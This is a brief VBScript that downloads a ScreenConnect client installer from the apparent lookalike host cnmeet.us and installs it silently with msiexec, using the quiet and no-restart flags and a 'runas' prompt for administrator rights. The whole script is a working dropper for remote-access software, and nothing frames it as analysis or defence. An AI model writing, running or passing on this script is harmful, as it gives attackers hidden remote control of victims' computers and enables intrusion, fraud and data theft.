Dim shell, msiPath, arguments

Set shell = CreateObject("Shell.Application")
msiPath = "https://cnmeet.us/srk/ScreenConnect.ClientSetup.msi"

' /i = Install, /qn = Quiet/No UI, /norestart = Do not reboot
arguments = "/i """ & msiPath & """ /qn /norestart"

On Error Resume Next

' runas forces the script to prompt for Administrator permissions
shell.ShellExecute "msiexec.exe", arguments, "", "runas", 1

If Err.Number <> 0 Then
    WScript.Echo "Error: " & Err.Description
Else
    WScript.Echo "Installation started silently."
End If

On Error Goto 0